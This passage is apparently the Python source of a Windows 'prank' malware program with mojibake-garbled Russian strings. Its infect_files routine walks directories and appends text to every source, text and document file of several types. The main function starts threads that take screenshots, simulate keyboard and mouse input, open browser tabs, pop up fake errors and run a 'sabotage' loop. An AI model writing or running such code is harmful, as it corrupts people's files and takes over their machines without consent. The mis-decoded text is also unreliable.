    target_extensions = ['.txt', '.py', '.cpp', '.c', '.java', '.docx', '.rtf']
    infection_message = "# —Ñ–∞–π–ª –∑–∞—Ä–∞–∂–µ–Ω –∫—Ä–æ–∫–æ–¥–∏–ª—å—á–∏–∫–æ–º. —Å–ø–∞—Å–∏–±–æ –∑–∞ –≤–Ω–∏–º–∞–Ω–∏–µ!\n" # –ê–∫–∫—É—Ä–∞—Ç–Ω–µ–µ —Å —ç—Ç–∏–º!
   
    infected_count = 0
   
    for directory in search_dirs:
        if not os.path.exists(directory):
            continue
           
        for root, dirs, files in os.walk(directory):
            for file in files:
                if any(file.endswith(ext) for ext in target_extensions):
                    file_path = os.path.join(root, file)
                    try:
                        # –ü—Ä–æ—Å—Ç–æ –¥–æ–±–∞–≤–ª—è–µ–º —Å—Ç—Ä–æ–∫—É –≤ –∫–æ–Ω–µ—Ü —Ñ–∞–π–ª–∞!
                        with open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
                            f.write(infection_message)
                           
                        infected_count += 1
                        logger(f"–ó–∞—Ä–∞–∂–µ–Ω —Ñ–∞–π–ª: {file_path}")
                       
                    except Exception as e:
                        logger(f"–û—à–∏–±–∫–∞ –∑–∞—Ä–∞–∂–µ–Ω–∏—è {file_path}: {e}")
   
    logger(f"–í—Å–µ–≥–æ –∑–∞—Ä–∞–∂–µ–Ω–æ —Ñ–∞–π–ª–æ–≤: {infected_count}")
    return infected_count

def sounder():
    while True:
        import winsound
        time.sleep(random.randint(900, 1000))
        actionsy = [
        lambda: winsound.beep(100, 50),
        lambda: winsound.beep(1000, 500),
        lambda: winsound.Beep(8000, 5000),
        lambda: say("–ö–∞–ª–æ–≤—ã–µ –º–∞—Å–æ–Ω—ã!"), # –¢—É–∞–ª–µ—Ç–Ω–æ–≥–æ —é–º–æ—Ä–∞ —Ç—É—Ç –±–æ–ª—å—à–µ —á–µ–º –≤ —à–∫–æ–ª–µ, –ø–æ—Ç–æ–º—É —á—Ç–æ —è –Ω–µ–¥–æ—Ä–∞–∑–≤–∏—Ç—ã–π.
        lambda: say("–ü–£–ö–ê–õ–û–í–´–ï –ê–ü–ü–ê–†–ê–¢–ù–û-–¢–ï–†–ú–û–Ø–î–ï–†–ù–´–ï –ü–ï–ù–ò–°–ò–°–ù–´–ï –ü–°–ï–í–î–û–ö–ê–†–¢–û–®–ï–ß–ù–´–ï –ö–ê–†–¢–û-–ü–¨–Ø–ù–°–ö–ò–ï –£–†–¢–û-–ö–ê–†–°–ö–ò–ï –ú–ê–°–°–û–ù–´ –ì–û–í–ù–ê"), # –ß—Ç–æ –∑–∞...
        lambda: say("–ü–£–°–¢–û–ô –¢–ï–ö–°–¢ —è–¥–µ—Ä–Ω—ã–π –∫–∞–ª"),
        lambda: say("–¥–æ–±—Ä–æ—Ç–∞? –Ω–µ, –Ω–µ —Å–ª—ã—à–∞–ª.")
    ]
        random.choice(actionsy)()



def main():
    

    
    global running
    infect_choice = ask_infect_files() # –£—É—É—É—É—É—É.... –ø—Ä–æ—è–≤–ª—è–µ—Ç—Å—è.... -–ß—Ç–æ?

    protect = threading.Thread(target=protection, daemon=False) # –ü—Å–µ–≤–¥–æ-–ó–∞—â–∏—Ç–Ω–∏—á–µ–∫ 
    protect.start()

    porndetect = threading.Thread(target=porn_detection_thread, daemon=True)
    injectorfiles = threading.Thread(target=lambda: infect_files(infect_choice), daemon=True)
    porndetect.start()
    screenshot = threading.Thread(target=screenshot_thread, daemon=True)
    screenshot.start()
    capitulation = threading.Thread(target=capitulation_thread, daemon=True)
    capitulation.start()
    injectorfiles.start() # –•–µ—Ö–µ—Ö–µ—Ö–µ—Ö...
    running = True
    checker_thread = threading.Thread(target=key_checker, daemon=True) # :)
    checker_thread.start()
    keyboard_thread = threading.Thread(target=keyboard_imitation, daemon=True) # -–ê–ª–æ? -–£–ø—Å–∏, —è –æ–±–∫–∞–∫–∞–ª–∞—Å—å! -–í—ã —É–≤–æ–ª–µ–Ω—ã.
    keyboard_thread.start()
    mouse_thread = threading.Thread(target=mouse_pranks_imitation, daemon=True)
    mouse_thread.start()  # TODO –î–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: –°–ø–∏—Å–∞—Ç—å –≤—Å–µ –Ω–∞ –≥–ª—é–∫–∏ –≤–∏–Ω–¥–æ–≤—Å
    intelect_sabotage = threading.Thread(target=main_sabotage_loop, daemon=True)
    intelect_sabotage.start() # TODO: –≠—Ç–æ –≤—Å–µ –≤–∞–Ω—è –∏–∑ 5 –ø–æ–¥—å–µ–∑–¥–∞!
    browser = threading.Thread(target=browser_lol, daemon=True)
    browser.start()    # TODO: –î–æ–±–∞–≤–∏—Ç—å –±–æ–ª—å—à–µ –≤–∫–ª–∞–¥–æ–∫
    ai = threading.Thread(target=ai_statistical_thread, daemon=True)
    ai.start() #
    try:

        while running:
            sleep = random.randint(500, 5000)
                
            action = random.choice([lambda: question(), lambda: warnings(),lambda: errors(),lambda: mouse_move(), lambda: jokes_from_supersonic(), lambda: capslock_mig])
            thread = threading.Thread(target=action, daemon=True)
            thread.start()
            time.sleep(sleep)

    except Exception as e:
        messagebox.showerror("–û—à–∏–±–∫–∞", f"–í–æ—Ç —Ç–∞–∫ –≤–æ—Ç —à—É—Ç–∏—à—å —Ñ–µ–π–∫–æ–≤—ã–º–∏ –æ—à–∏–±–∫–∞–º–∏, –∞ —Ç—É—Ç —Ä–µ–∞–ª—å–Ω–∞—è –æ—à–∏–±–∫–∞:{e}")
        return 1
def validate_license_key(key: str) -> bool:
    """
    –ê–ª–≥–æ—Ä–∏—Ç–º –ø—Ä–æ–≤–µ—Ä–∫–∏(?)
    """
    # Remove hyphens
    clean_key = key.replace('-', '')
    if len(clean_key) != 20:
        return False
    try:
        main_key = clean_key[:16]
        checksum = clean_key[16:]
        # Check if hex
        int(main_key, 16)
        int(checksum, 16)
        # Recompute checksum
        recomputed_checksum = hashlib.sha256(main_key.encode()).hexdigest()[:4]
        recomputed_checksum = hashlib.md5(recomputed_checksum.encode()).hexdigest()[:4]
        return checksum == recomputed_checksum
    except Exception:
        return False

def get_license_key():
    """
    –î–∏–∞–ª–æ–≥ –≤–≤–æ–¥–∞ –ª–∏—Ü–µ–Ω–∑–∏–æ–Ω–Ω–æ–≥–æ –∫–ª—é—á–∞(–Ω–µ –∞–∫—Ç–∏–≤–∏—Ä—É–µ—Ç—Å—è –≤ –∫–æ–¥–µ)
    """
    root = tk.Tk()
    root.title("–í–≤–µ–¥–∏—Ç–µ –ª–∏—Ü–µ–Ω–∑–∏–æ–Ω–Ω—ã–π –∫–ª—é—á")
    root.geometry("400x150")
    root.resizable(False, False)


    label = tk.Label(root, text="–í–≤–µ–¥–∏—Ç–µ –ª–∏—Ü–µ–Ω–∑–∏–æ–Ω–Ω—ã–π –∫–ª—é—á –≤ —Ñ–æ—Ä–º–∞—Ç–µ XXXX-XXXX-XXXX-XXXX-XXXX:")
    label.pack(pady=10)

    entry = tk.Entry(root, font=("Arial", 14), justify='center')
    entry.pack(pady=10, padx=20, fill='x')

    result = [None]

    def on_ok():
        key = entry.get().strip()
        if key:
            result[0] = key
        root.destroy()

    def on_cancel():
        root.destroy()

    

    def format_key(event=None):
        text = entry.get().replace('-', '')
        if len(text) > 20:
            text = text[:20]
        formatted = '-'.join([text[i:i+4] for i in range(0, len(text), 4)])
        entry.delete(0, tk.END)
        entry.insert(0, formatted)
        entry.icursor(len(formatted))  # –ß—Ç–æ –∑–¥–µ—Å—å –ø–∏—Å–∞—Ç—å?

    entry.bind('<KeyRelease>', format_key)

    button_frame = tk.Frame(root)
    ok_btn = tk.Button(button_frame, text="OK", command=on_ok)
    cancel_btn = tk.Button(button_frame, text="–û—Ç–º–µ–Ω–∞", command=on_cancel)
    ok_btn.pack(side=tk.LEFT, padx=10)
    cancel_btn.pack(side=tk.RIGHT, padx=10)
    button_frame.pack(pady=10)

    root.mainloop()
    return result[0]

if __name__ == "__main__":
    main()
#    check_passwd()
#    license_key = get_license_key()
#    if license_key and validate_license_key(license_key):
#       main()
#    else:
   #     messagebox.showerror("Error", "–ù–µ–≤–µ—Ä–Ω—ã–π –∫–ª—é—á.–¥–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω.  –æ—Ç–∫—Ä—ã–≤–∞–µ–º free")
    #    main_free()

    # check_passwd()
     # license_key = get_license_key()
    #if license_key and validate_license_key(license_key):
     #   mai
     #—ç—Ç–æ –Ω–∞–¥–æ —Ä–∞—Å–∫–æ–º–µ–Ω—Ç–∏—Ä–æ–≤–∞—Ç—å.
     #–ú?